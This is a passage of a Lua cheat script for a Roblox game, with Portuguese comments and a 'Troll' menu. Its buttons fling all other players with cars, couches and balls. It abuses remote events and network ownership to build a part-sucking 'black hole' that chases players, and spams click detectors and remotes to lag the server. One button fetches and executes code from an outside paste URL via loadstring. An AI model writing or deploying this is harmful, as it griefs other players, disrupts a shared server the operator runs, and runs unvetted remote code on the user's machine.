\n      \n            -- Adiciona o BodyGyro ao carro para controle de movimento  \n            local SpinGyro = Instance.new("BodyGyro")  \n            SpinGyro.Parent = PCar.PrimaryPart  \n            SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)  \n            SpinGyro.P = 1e7  \n            SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)  \n      \n            -- Fun\195\167\195\163o de Fling em cada jogador por 3 segundos  \n            local function flingPlayer(TargetC, TargetRP, TargetH)\n    Angles = 0  \n                local endTime = tick() + 1  -- Define o tempo final em 2 segundos a partir de agora  \n                while tick() < endTime do  \n                    Angles = Angles + 100  \n                    task.wait()  \n      \n                    -- Movimentos e \195\162ngulos para o Fling  \n                    local kill = function(alvo, pos, angulo)  \n                        PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)  \n                    end  \n      \n                    -- Fling para v\195\161rias posi\195\167\195\181es ao redor do TargetRP  \n                    kill(TargetRP, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(Angles), 0, 0))  \n                    kill(TargetRP, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(Angles), 0, 0))  \n                    kill(TargetRP, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))  \n                    kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))  \n                    kill(TargetRP, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  \n                    kill(TargetRP, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  \n                end  \n            end  \n      \n            -- Itera sobre todos os jogadores  \n            for _, Target in pairs(game.Players:GetPlayers()) do  \n                -- Pula o jogador local  \n                if Target ~= Player then  \n                    local TargetC = Target.Character  \n                    local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")  \n                    local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")  \n      \n                    -- Se encontrar o alvo e seus componentes, executa o fling  \n                    if TargetC and TargetH and TargetRP then  \n                        flingPlayer(TargetC, TargetRP, TargetH)  -- Fling no jogador atual  \n                    end  \n                end  \n            end  \n      \n            -- Retorna o jogador para sua posi\195\167\195\163o original  \n            task.wait(0.5)  \n            PCar:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))  \n            task.wait(0.5)  \n            Humanoid.Sit = false  \n            task.wait(0.5)  \n            RootPart.CFrame = OldPos  \n      \n            -- Remove o BodyGyro ap\195\179s o efeito  \n            SpinGyro:Destroy()  \n    end\n})\nprint("Fling Boat All button created")\n\nTroll:AddButton({\n    Name = "FLING TODOS ARMS",\n    Callback = function()\n    local Players = game:GetService("Players")\n    local ReplicatedStorage = game:GetService("ReplicatedStorage")\n    local LocalPlayer = Players.LocalPlayer\n    local cam = workspace.CurrentCamera\n\n\n    local function ProcessPlayer(target)\n        if not target or not target.Character or target == LocalPlayer then return end\n        \n        local flingActive = true\n        local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")\n        local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")\n        if not root or not tRoot then return end\n        \n        local char = LocalPlayer.Character\n        local hum = char:FindFirstChildOfClass("Humanoid")\n        local original = root.CFrame\n\n    \n        ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")\n        task.wait(0.2)\n\n  \n        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n        task.wait(0.3)\n\n        local tool = LocalPlayer.Backpack:FindFirstChild("Couch")\n        if tool then\n            tool.Parent = char\n        end\ntask.wait(0.1)\n\ngame:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)\ntask.wait(0.25)\n\n        workspace.FallenPartsDestroyHeight = 0/0\n\n        local bv = Instance.new("BodyVelocity")\n        bv.Name = "FlingForce"\n        bv.Velocity = Vector3.new(9e8, 9e8, 9e8)\n        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n        bv.Parent = root\n\n        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n        hum.PlatformStand = false\n        cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum\n\n \n        task.spawn(function()\n            local angle = 0\n            local parts = {root}\n            while flingActive and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do\n                local tHum = target.Character:FindFirstChildOfClass("Humanoid")\n                if tHum.Sit then break end\n                angle += 50\n\n                for _, part in ipairs(parts) do\n                    local hrp = target.Character.HumanoidRootPart\n                    local pos = hrp.Position + hrp.Velocity / 1.5\n                    root.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(angle), 0, 0)\n                end\n\n                root.Velocity = Vector3.new(9e8, 9e8, 9e8)\n                root.RotVelocity = Vector3.new(9e8, 9e8, 9e8)\n                task.wait()\n            end\n\n         \n            flingActive = false\n            bv:Destroy()\n            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n            hum.PlatformStand = false\n            root.CFrame = original\n            cam.CameraSubject = hum\n\n            for _, p in pairs(char:GetDescendants()) do\n                if p:IsA("BasePart") then\n                    p.Velocity = Vector3.zero\n                    p.RotVelocity = Vector3.zero\n                end\n            end\n\n            hum:UnequipTools()\n            ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n        end)\n       \n        while flingActive do\n            task.wait()\n        end\n    end\n\n\n    for _, player in ipairs(Players:GetPlayers()) do\n        ProcessPlayer(player)\n\t\t\tend\n    end\n})\n\n\n\nTroll:AddButton({\n    Name = "FLING TODOS BOLA",\n    Callback = function()\nlocal player=game:GetService("Players").LocalPlayer\nlocal SoccerBalls=workspace.WorkspaceCom["001_SoccerBalls"]\nlocal MyBall=SoccerBalls:FindFirstChild("Soccer"..player.Name)\n\nif not MyBall then\nif not player.Backpack:FindFirstChild("SoccerBall") then\nlocal args={[1]="PickingTools",[2]="SoccerBall"}\ngame:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))\ntask.wait()\nplayer.Backpack.SoccerBall.Parent=player.Character\nrepeat MyBall=SoccerBalls:FindFirstChild("Soccer"..player.Name) task.wait() until MyBall\nplayer.Character.SoccerBall.Parent=player.Backpack\ntask.wait()\nelse\nplayer.Backpack.SoccerBall.Parent=player.Character\nrepeat MyBall=SoccerBalls:FindFirstChild("Soccer"..player.Name) task.wait() until MyBall\nplayer.Character.SoccerBall.Parent=player.Backpack\nend\nend\n\n\nfor i,v in pairs(game.Players:GetPlayers()) do\nif v~=game.Players.LocalPlayer then\nlocal target=v\nlocal TCharacter=target.Character or target.CharacterAdded:Wait()\nlocal THumanoidRootPart=TCharacter:WaitForChild("HumanoidRootPart")\nif not MyBall or not THumanoidRootPart then return end\n\nfor _,v in pairs(MyBall:GetChildren()) do\nif v:IsA("BodyMover") then v:Destroy() end\nend\n\nlocal bodyVelocity=Instance.new("BodyVelocity")\nbodyVelocity.Velocity=Vector3.new(9e8,9e8,9e8)\nbodyVelocity.MaxForce=Vector3.new(1/0,1/0,1/0)\nbodyVelocity.P=1e10\nbodyVelocity.Parent=MyBall\n\nlocal bv=Instance.new("BodyVelocity")\nbv.Velocity=Vector3.new(9e8,9e8,9e8)\nbv.MaxForce=Vector3.new(1/0,1/0,1/0)\nbv.P=1e9\nbv.Parent=THumanoidRootPart\n\nlocal oldPos=THumanoidRootPart.Position\nworkspace.CurrentCamera.CameraSubject=THumanoidRootPart\n\nrepeat\nlocal velocity=THumanoidRootPart.Velocity.Magnitude\nlocal parts={}\nfor _,v in pairs(TCharacter:GetDescendants()) do\nif v:IsA("BasePart") and v.CanCollide and not v.Anchored then table.insert(parts,v) end\nend\nfor _,part in ipairs(parts) do\nlocal pos_x=target.Character.HumanoidRootPart.Position.X\nlocal pos_y=target.Character.HumanoidRootPart.Position.Y\nlocal pos_z=target.Character.HumanoidRootPart.Position.Z\npos_x=pos_x+(target.Character.HumanoidRootPart.Velocity.X/1.5)\npos_y=pos_y+(target.Character.HumanoidRootPart.Velocity.Y/1.5)\npos_z=pos_z+(target.Character.HumanoidRootPart.Velocity.Z/1.5)\nMyBall.CFrame=CFrame.new(pos_x,pos_y,pos_z)\ntask.wait(1/6000)\nend\ntask.wait(1/6000)\nuntil THumanoidRootPart.Velocity.Magnitude>5000 or TCharacter.Humanoid.Health==0 or target.Parent~=game.Players or THumanoidRootPart.Parent~=TCharacter or TCharacter~=target.Character\n\nend\nend\n\nworkspace.CurrentCamera.CameraSubject=game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")\n  end\n})\n\nlocal kill = Troll:AddSection({Name = "MENU PRA\199A"})\n\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\nlocal Workspace = game:GetService("Workspace")\nlocal RunService = game:GetService("RunService")\n\nlocal blackHoleActive = false\nlocal DescendantAddedConnection\nlocal rotationConnection\n\nlocal Folder = Instance.new("Folder", Workspace)\nFolder.Name = "BringPartsFolder"\n\nlocal Part = Instance.new("Part", Folder)\nPart.Anchored = true\nPart.CanCollide = false\nPart.Transparency = 1\nPart.Size = Vector3.new(5, 5, 5)\nPart.Position = Vector3.new(-26.54624575495172, 4.13895320892334, 3.941930037536621)\n\nlocal Attachment1 = Instance.new("Attachment", Part)\n\nlocal function ForcePart(v)\n    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid")\n        and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then\n\n        for _, x in ipairs(v:GetChildren()) do \n            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then \n                x:Destroy() \n            end \n        end\n        \n        if v:FindFirstChild("Attachment") then \n            v:FindFirstChild("Attachment"):Destroy() \n        end\n        \n        if v:FindFirstChild("AlignPosition") then \n            v:FindFirstChild("AlignPosition"):Destroy() \n        end\n        \n        if v:FindFirstChild("Torque") then \n            v:FindFirstChild("Torque"):Destroy() \n        end\n        \n        v.CanCollide = false\n        \n        local torque = Instance.new("Torque", v)\n        torque.Torque = Vector3.new(9e9, 9e9, 9e9)\n        \n        local align = Instance.new("AlignPosition", v)\n        local att = Instance.new("Attachment", v)\n        \n        torque.Attachment0 = att\n        \n        align.MaxForce = 1e12\n        align.MaxVelocity = 1e12\n        align.Responsiveness = 1e12\n        align.Attachment0 = att\n        align.Attachment1 = Attachment1\n    end \nend\n\nif not getgenv().Network then\n    getgenv().Network = {\n        BaseParts = {},\n        Velocity = Vector3.new(1e8, 1e8, 1e8)\n    }\n\n    getgenv().Network.RetainPart = function(PartObj) \n        if typeof(PartObj) == "Instance" and PartObj:IsA("BasePart") and PartObj:IsDescendantOf(Workspace) then \n            table.insert(getgenv().Network.BaseParts, PartObj) \n            PartObj.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0) \n            PartObj.CanCollide = false \n        end \n    end\n    \n    RunService.Heartbeat:Connect(function() \n        pcall(function() \n            sethiddenproperty(Players.LocalPlayer, "SimulationRadius", math.huge) \n        end) \n        for _, part in ipairs(getgenv().Network.BaseParts) do \n            if part:IsDescendantOf(Workspace) then \n                part.Velocity = getgenv().Network.Velocity \n            end \n        end \n    end) \nend\n\n-- Fun\231\227o para travar o personagem na posi\231\227o\nlocal function travarPersonagem()\n    local character = LocalPlayer.Character\n    if not character then return end\n    \n    local humanoid = character:FindFirstChildOfClass("Humanoid")\n    local rootPart = character:FindFirstChild("HumanoidRootPart")\n    \n    if humanoid and rootPart then\n        -- Remove anima\231\227o de sentar\n        humanoid.Sit = false\n        \n        -- Cria corpo de velocidade zero para travar\n        local bodyVelocity = Instance.new("BodyVelocity", rootPart)\n        bodyVelocity.Velocity = Vector3.new(0, 0, 0)\n        bodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)\n        bodyVelocity.Name = "TravarVelocity"\n        \n        -- Cria corpo de posi\231\227o para manter no lugar\n        local bodyPosition = Instance.new("BodyPosition", rootPart)\n        bodyPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)\n        bodyPosition.MaxForce = Vector3.new(1e6, 1e6, 1e6)\n        bodyPosition.Name = "TravarPosition"\n        \n        -- Mant\233m o personagem travado\n        task.spawn(function()\n            while blackHoleActive and character and character.Parent do\n                task.wait()\n                pcall(function()\n                    humanoid.Sit = false\n                    if rootPart and rootPart:FindFirstChild("TravarPosition") then\n                        rootPart.TravarPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)\n                    end\n                end)\n            end\n        end)\n    end\nend\n\nfunction toggleBlackHole()\n    blackHoleActive = not blackHoleActive\n\n    if blackHoleActive then\n        -- Teleporta o personagem primeiro\n        local character = LocalPlayer.Character\n        if character then\n            local rootPart = character:FindFirstChild("HumanoidRootPart")\n            if rootPart then\n                rootPart.CFrame = CFrame.new(-308.447265625, 42.98085403442383, 94.30621337890625)\n            end\n        end\n        \n        -- Trava o personagem\n        travarPersonagem()\n        \n        -- For\231ar todas as partes existentes\n        for _, v in ipairs(Workspace:GetDescendants()) do \n            ForcePart(v) \n        end\n        \n        -- Monitorar novas partes\n        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v) \n            if blackHoleActive then \n                ForcePart(v) \n            end \n        end)\n        \n        -- Rota\231\227o ultra r\225pida\n        local rotationSpeed = 999999\n        local angle = 0\n        \n        rotationConnection = RunService.RenderStepped:Connect(function()\n            if blackHoleActive then\n                angle = angle + math.rad(rotationSpeed)\n                -- Rotacionar o ponto de ancoragem\n                local centerPos = Part.Position\n                local newPos = centerPos + Vector3.new(\n                    math.sin(angle) * 2,\n                    math.cos(angle * 2) * 1,\n                    math.cos(angle) * 2\n                )\n                Attachment1.WorldPosition = newPos\n            end\n        end)\n        \n    else\n        if DescendantAddedConnection then\n            DescendantAddedConnection:Disconnect()\n            DescendantAddedConnection = nil\n        end\n        if rotationConnection then\n            rotationConnection:Disconnect()\n            rotationConnection = nil\n        end\n        \n        -- Remove os corpos de trava do personagem\n        local character = LocalPlayer.Character\n        if character then\n            local rootPart = character:FindFirstChild("HumanoidRootPart")\n            if rootPart then\n                if rootPart:FindFirstChild("TravarVelocity") then\n                    rootPart.TravarVelocity:Destroy()\n                end\n                if rootPart:FindFirstChild("TravarPosition") then\n                    rootPart.TravarPosition:Destroy()\n                end\n            end\n        end\n        \n        -- Limpar attachments\n        for _, v in ipairs(Workspace:GetDescendants()) do\n            if v:IsA("BasePart") then\n                for _, child in ipairs(v:GetChildren()) do\n                    if child:IsA("AlignPosition") or child:IsA("Torque") then\n                        child:Destroy()\n                    end\n                end\n            end\n        end\n    end\nend\n\n-- UI sem dropdown\nTroll:AddButton({\n    Name = "AUTO SPAW ELI",\n    Description = "SPAWNA HELI SALVA VIDAS NA PRA\199A",\n    Callback = function()\n        if not blackHoleActive then\n            toggleBlackHole()\n            print("SEXO")\n        else\n            print("\160\15 FLING j\225 est\225 ativo")\n        end\n    end\n})\n\nTroll:AddButton({\n    Name = "DESATIVAR",\n    Callback = function()\n        if blackHoleActive then\n            toggleBlackHole()\n            print("GTVZ")\n        else\n            print("GTVZ")\n        end\n    end\n})\n\nlocal kill = Troll:AddSection({Name = "MENU JOGADOR"})\n\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\nlocal Workspace = game:GetService("Workspace")\nlocal RunService = game:GetService("RunService")\n\nlocal blackHoleActive = false\nlocal DescendantAddedConnection\nlocal rotationConnection\n\nlocal Folder = Instance.new("Folder", Workspace)\nFolder.Name = "BringPartsFolder"\n\nlocal Part = Instance.new("Part", Folder)\nPart.Anchored = true\nPart.CanCollide = false\nPart.Transparency = 1\nPart.Size = Vector3.new(5, 5, 5)\n\nlocal Attachment1 = Instance.new("Attachment", Part)\n\nlocal function ForcePart(v)\n    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid")\n        and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then\n\n        for _, x in ipairs(v:GetChildren()) do \n            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then \n                x:Destroy() \n            end \n        end\n        \n        if v:FindFirstChild("Attachment") then \n            v:FindFirstChild("Attachment"):Destroy() \n        end\n        \n        if v:FindFirstChild("AlignPosition") then \n            v:FindFirstChild("AlignPosition"):Destroy() \n        end\n        \n        if v:FindFirstChild("Torque") then \n            v:FindFirstChild("Torque"):Destroy() \n        end\n        \n        v.CanCollide = false\n        \n        local torque = Instance.new("Torque", v)\n        torque.Torque = Vector3.new(9e9, 9e9, 9e9)\n        \n        local align = Instance.new("AlignPosition", v)\n        local att = Instance.new("Attachment", v)\n        \n        torque.Attachment0 = att\n        \n        align.MaxForce = 1e12\n        align.MaxVelocity = 1e12\n        align.Responsiveness = 1e12\n        align.Attachment0 = att\n        align.Attachment1 = Attachment1\n    end \nend\n\nif not getgenv().Network then\n    getgenv().Network = {\n        BaseParts = {},\n        Velocity = Vector3.new(1e8, 1e8, 1e8)\n    }\n\n    getgenv().Network.RetainPart = function(PartObj) \n        if typeof(PartObj) == "Instance" and PartObj:IsA("BasePart") and PartObj:IsDescendantOf(Workspace) then \n            table.insert(getgenv().Network.BaseParts, PartObj) \n            PartObj.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0) \n            PartObj.CanCollide = false \n        end \n    end\n    \n    RunService.Heartbeat:Connect(function() \n        pcall(function() \n            sethiddenproperty(Players.LocalPlayer, "SimulationRadius", math.huge) \n        end) \n        for _, part in ipairs(getgenv().Network.BaseParts) do \n            if part:IsDescendantOf(Workspace) then \n                part.Velocity = getgenv().Network.Velocity \n            end \n        end \n    end) \nend\n\n-- Fun\231\227o para travar o personagem na posi\231\227o\nlocal function travarPersonagem()\n    local character = LocalPlayer.Character\n    if not character then return end\n    \n    local humanoid = character:FindFirstChildOfClass("Humanoid")\n    local rootPart = character:FindFirstChild("HumanoidRootPart")\n    \n    if humanoid and rootPart then\n        -- Remove anima\231\227o de sentar\n        humanoid.Sit = false\n        \n        -- Cria corpo de velocidade zero para travar\n        local bodyVelocity = Instance.new("BodyVelocity", rootPart)\n        bodyVelocity.Velocity = Vector3.new(0, 0, 0)\n        bodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)\n        bodyVelocity.Name = "TravarVelocity"\n        \n        -- Cria corpo de posi\231\227o para manter no lugar\n        local bodyPosition = Instance.new("BodyPosition", rootPart)\n        bodyPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)\n        bodyPosition.MaxForce = Vector3.new(1e6, 1e6, 1e6)\n        bodyPosition.Name = "TravarPosition"\n        \n        -- Mant\233m o personagem travado\n        task.spawn(function()\n            while blackHoleActive and character and character.Parent do\n                task.wait()\n                pcall(function()\n                    humanoid.Sit = false\n                    if rootPart and rootPart:FindFirstChild("TravarPosition") then\n                        rootPart.TravarPosition.Position = Vector3.new(-308.447265625, 42.98085403442383, 94.30621337890625)\n                    end\n                end)\n            end\n        end)\n    end\nend\n\nfunction toggleBlackHole()\n    blackHoleActive = not blackHoleActive\n\n    if blackHoleActive then\n        -- Teleporta o personagem primeiro\n        local character = LocalPlayer.Character\n        if character then\n            local rootPart = character:FindFirstChild("HumanoidRootPart")\n            if rootPart then\n                rootPart.CFrame = CFrame.new(-308.447265625, 42.98085403442383, 94.30621337890625)\n            end\n        end\n        \n        -- Trava o personagem\n        travarPersonagem()\n        \n        -- For\231ar todas as partes existentes\n        for _, v in ipairs(Workspace:GetDescendants()) do \n            ForcePart(v) \n        end\n        \n        -- Monitorar novas partes\n        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v) \n            if blackHoleActive then \n                ForcePart(v) \n            end \n        end)\n        \n        -- Perseguir jogador aleat\243rio ACIMA DA CABE\199A (trocando a cada 0.5 segundos)\n        local currentTarget = nil\n        local lastChange = 0\n        \n        rotationConnection = RunService.RenderStepped:Connect(function(deltaTime)\n            if blackHoleActive then\n                lastChange = lastChange + deltaTime\n                \n                -- Troca de alvo a cada 0.5 segundos\n                if lastChange >= 0.5 or not currentTarget then\n                    lastChange = 0\n                    \n                    local players = Players:GetPlayers()\n                    local validPlayers = {}\n                    \n                    for _, player in ipairs(players) do\n                        if player ~= LocalPlayer and player.Character then\n                            local rootPart = player.Character:FindFirstChild("HumanoidRootPart")\n                            local head = player.Character:FindFirstChild("Head")\n                            if rootPart and head then\n                                table.insert(validPlayers, head)\n                            end\n                        end\n                    end\n                    \n                    if #validPlayers > 0 then\n                        currentTarget = validPlayers[math.random(1, #validPlayers)]\n                    end\n                end\n                \n                -- Atualiza posi\231\227o acima da cabe\231a do alvo atual\n                if currentTarget then\n                    Attachment1.WorldPosition = currentTarget.Position + Vector3.new(0, 5, 0)\n                end\n            end\n        end)\n        \n    else\n        if DescendantAddedConnection then\n            DescendantAddedConnection:Disconnect()\n            DescendantAddedConnection = nil\n        end\n        if rotationConnection then\n            rotationConnection:Disconnect()\n            rotationConnection = nil\n        end\n        \n        -- Remove os corpos de trava do personagem\n        local character = LocalPlayer.Character\n        if character then\n            local rootPart = character:FindFirstChild("HumanoidRootPart")\n            if rootPart then\n                if rootPart:FindFirstChild("TravarVelocity") then\n                    rootPart.TravarVelocity:Destroy()\n                end\n                if rootPart:FindFirstChild("TravarPosition") then\n                    rootPart.TravarPosition:Destroy()\n                end\n            end\n        end\n        \n        -- Limpar attachments\n        for _, v in ipairs(Workspace:GetDescendants()) do\n            if v:IsA("BasePart") then\n                for _, child in ipairs(v:GetChildren()) do\n                    if child:IsA("AlignPosition") or child:IsA("Torque") then\n                        child:Destroy()\n                    end\n                end\n            end\n        end\n    end\nend\n\n-- UI sem dropdown\nTroll:AddButton({\n    Name = "AUTO SPAW ELI JOGADOR",\n    Description = "SPAWNA ELI NOS JOGADORES ESPALHANDO ELI PELO MAPA",\n    Callback = function()\n        if not blackHoleActive then\n            toggleBlackHole()\n            print("GTVZ")\n        else\n            print("GTVZ")\n        end\n    end\n})\n\nTroll:AddButton({\n    Name = "DESATIVAR",\n    Callback = function()\n        if blackHoleActive then\n            toggleBlackHole()\n            print("L FLING DESATIVADO")\n        else\n            print("\160\15 FLING j\225 est\225 desativado")\n        end\n    end\n})\n\nlocal kill = Troll:AddSection({Name = "LAGA SERVER"})\n\nlocal toggles = { LagLaptop = false }\n\n-- Function to Simulate Normal Click\nlocal function clickNormally(object)\n    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")\n    if clickDetector then\n        fireclickdetector(clickDetector)\n    end\nend\n\n-- Function to Lag Game with Laptop\nlocal function lagarJogoLaptop(laptopPath, maxTeleports)\n    if laptopPath then\n        local teleportCount = 0\n        while teleportCount < maxTeleports and toggles.LagLaptop do\n            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = laptopPath.CFrame\n            clickNormally(laptopPath)\n            teleportCount = teleportCount + 1\n            wait(0.0001)\n        end\n    else\n        warn("Laptop n\227o encontrado.")\n    end\nend\n\n-- Lag Laptop Toggle\nTroll:AddToggle({\n    Name = "LAG COMPUTADOR",\n    Default = false,\n    Callback = function(state)\n        toggles.LagLaptop = state\n        if state then\n            local laptopPath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_GiveTools"):FindFirstChild("Laptop")\n            if laptopPath then\n                spawn(function()\n                    lagarJogoLaptop(laptopPath, 999999999)\n                end)\n            else\n                warn("Laptop n\227o encontrado.")\n            end\n        else\n            print("Lag com Laptop desativado.")\n        end\n    end\n})\n\n\n-- Toggle State for Lag Phone\ntoggles.LagPhone = false\n\n-- Function to Lag Game with Phone\nlocal function lagarJogoPhone(phonePath, maxTeleports)\n    if phonePath then\n        local teleportCount = 0\n        while teleportCount < maxTeleports and toggles.LagPhone do\n            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = phonePath.CFrame\n            clickNormally(phonePath)\n            teleportCount = teleportCount + 1\n            wait(0.01)\n        end\n    else\n        warn("Telefone n\227o encontrado.")\n    end\nend\n\n-- Lag Phone Toggle\nTroll:AddToggle({\n    Name = "LAG CELULA",\n    Default = false,\n    Callback = function(state)\n        toggles.LagPhone = state\n        if state then\n            local phonePath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_CommercialStores"):FindFirstChild("CommercialStorage1"):FindFirstChild("Store"):FindFirstChild("Tools"):FindFirstChild("Iphone")\n            if phonePath then\n                spawn(function()\n                    lagarJogoPhone(phonePath, 999999)\n                end)\n            else\n                warn("Telefone n\227o encontrado.")\n            end\n        else\n            print("Lag com Telefone desativado.")\n        end\n    end\n})\n\n\nlocal BombActive = false\n\nTroll:AddToggle({\n    Name = "LAG BOMBA",\n    Default = false,\n    Callback = function(Value)\n        if Value then\n            BombActive = true\n\n            local Player = game.Players.LocalPlayer\n            local Character = Player.Character or Player.CharacterAdded:Wait()\n            local RootPart = Character:WaitForChild("HumanoidRootPart")\n            local WorkspaceService = game:GetService("Workspace")\n            local ReplicatedStorage = game:GetService("ReplicatedStorage")\n            local Bomb = WorkspaceService:WaitForChild("WorkspaceCom"):WaitForChild("001_CriminalWeapons"):WaitForChild("GiveTools"):WaitForChild("Bomb")\n\n            task.spawn(function()\n                while BombActive do\n                    if Bomb and RootPart then\n                        RootPart.CFrame = Bomb.CFrame\n                        fireclickdetector(Bomb.ClickDetector) -- Aciona o ClickDetector da bomba\n                        task.wait(0.00001) -- Delay m\237nimo para evitar travamentos\n                    else\n                        task.wait(0.0001) \n                    end\n                end\n            end)\n\n            task.spawn(function()\n                while BombActive do\n                    if Bomb and RootPart then\n                        local VirtualInputManager = game:GetService("VirtualInputManager")\n                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, true, game, 0) \n                        task.wait(1.5)\n                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, false, game, 0) \n\n                        -- Executa o FireServer com o nome do jogador\n                        local args = {\n                            [1] = "Bomb" .. Player.Name -- Usa o nome do jogador atual\n                        }\n                        ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Blo1wBomb1sServe1r"):FireServer(unpack(args))\n                    end\n                    task.wait(1.5) -- Intervalo de 1 segundo para clique e FireServer\n                end\n            end)\n        else\n            -- Desativando a funcionalidade\n            BombActive = false\n        end\n    end\n})\n\nlocal kill = Troll:AddSection({Name = "MENU CEU"})\n\nTroll:AddButton({\n    Name = "IMAGEM NO CEU",\n    Callback = function()\n        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/qZkSict1retkqFIr/raw"))()\n    end\n})\n\nTroll:AddButton({\n    Name = "DESATIVAR IMAGEM",\n    Callback = function()\n        -- Para todas as anima\231\245es\n        if rigidTrack then\n            pcall(function()\n                rigidTrack:Stop()\n                rigidTrack:Destroy()\n            end)\n            rigidTrack = nil\n        end\n        \n        if skyboxTrack then\n            pcall(function()\n                skyboxTrack:Stop()\n                skyboxTrack:Destroy()\n            end)\n            skyboxTrack = nil\n        end\n        \n        -- Para anima\231\245es no personagem\n        local player = game.Players.LocalPlayer\n        local character = player.Character\n        if character then\n            local humanoid = character:FindFirstChild("Humanoid")\n            if humanoid then\n                local animator = humanoid:FindFirstChild("Animator")\n                if animator then\n                    for _, track in pairs(animator:GetPlayingAnimationTracks()) do\n                        if track.Animation then\n                            local animId = track.Animation.AnimationId\n                            if animId == "rbxassetid://70883871260184" or animId == "rbxassetid://3695333486" then\n                                pcall(function()\n                                    track:Stop()\n                                end)\n                            end\n                        end\n                    end\n                end\n            end\n        end\n        \n        -- Remove o skybox\n        pcall(function()\n            if game.Lighting:FindFirstChild("Skybox") then\n                game.Lighting.Skybox:Destroy()\n            end\n        end)\n        \n        -- Restaura corpos salvos\n        for _, body in pairs(savedNukeBody) do\n            pcall(function()\n                body:Destroy()\n            end)\n        end\n        savedNukeBody = {}\n        \n        skyboxEnabled = false\n        print("L IMAGEM NO C\201U DESATIVADA")\n    end\n})\n\nTroll:AddToggle({\n    Name = "IMAGEM NO CEU 1.0",\n    Default = false,\n    Callback = function(value)\n        skyboxEnabled = value\n        \n        if value then\n            local player = game.Players.LocalPlayer\n            local character = player.Character\n            \n            if character then\n                local humanoid = character:FindFirstChildOfClass("Humanoid")\n                if humanoid then\n                    local description = humanoid:GetAppliedDescription()\n                    \n                    savedNukeBody = {\n                        Torso = description.Torso,\n                        RightArm = description.RightArm,\n                        LeftArm = description.LeftArm,\n                        RightLeg = description.RightLeg,\n                        LeftLeg = description.LeftLeg,\n                        Head = description.Head\n                    }\n                    \n                    task.wait(0.2)\n                    \n                    local args = {\n                        [1] = 123402086843885,\n                        [2] = 100839513065432,\n                        [3] = 78300682916056,\n                        [4] = 86276701020724,\n                        [5] = 78409653958165,\n                        [6] = 15093053680\n                    }\n                    \n                    pcall(function()\n                        game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(args)\n                    end)\n                    \n                    task.wait(0.3)\n                    \n                    local newAnim = Instance.new("Animation")\n                    newAnim.AnimationId = "rbxassetid://70883871260184"\n                    \n                    skyboxTrack = humanoid:LoadAnimation(newAnim)\n                    skyboxTrack.Priority = Enum.AnimationPriority.Action4\n                    skyboxTrack:Play(0.1, 1, 0.01)\n                    \n                    task.wait(0.5)\n                    \n                    local plankAnim = Instance.new("Animation")\n                    plankAnim.AnimationId = "rbxassetid://3695333486"\n                    rigidTrack = humanoid:LoadAnimation(plankAnim)\n                    rigidTrack.Priority = Enum.AnimationPriority.Movement\n                    rigidTrack:Play(0.1, 1, 0)\n                end\n            end\n        else\n            stopAllAnimations()\n            \n            task.wait(0.2)\n            \n            if next(savedNukeBody) then\n                local player = game.Players.LocalPlayer\n                local character = player.Character\n                \n                if character then\n                    local humanoid = character:FindFirstChildOfClass("Humanoid")\n                    if humanoid then\n                        local restoreBody 